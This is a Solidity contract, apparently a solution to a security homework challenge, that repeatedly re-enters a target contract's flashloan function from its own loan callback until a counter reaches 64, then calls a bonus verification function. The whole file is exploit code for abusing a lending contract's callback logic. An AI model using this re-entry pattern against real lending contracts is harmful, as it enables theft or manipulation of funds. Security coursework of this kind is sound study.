pragma solidity ^0.4.21;
import "./CNS_contract.sol";
import "./CNSToken.sol";
import "hardhat/console.sol";

contract flashloan is IFlashLoanReceiver{
    address target = 0x31877e75Ad477579A885Ca5006A208E0058cE58B;
    function call_flashloan() public payable {
        HW3 cns = HW3(target);
        cns.flashloan(160);
    }
    uint8 public i = 1;
    function execute(address tokenAddr, address lender, uint256 amount) external returns (bool){
        HW3 cns = HW3(target);
        CNSToken cnsToken = CNSToken(tokenAddr);
        if(i < 64){
            i = i + 1;
            cns.flashloan(160);
        }
        if(i == 64){
            i = 1;
            cns.bonus_verify("r09921090");
        }
        cnsToken.approve(lender,amount);
        return true;
    }
}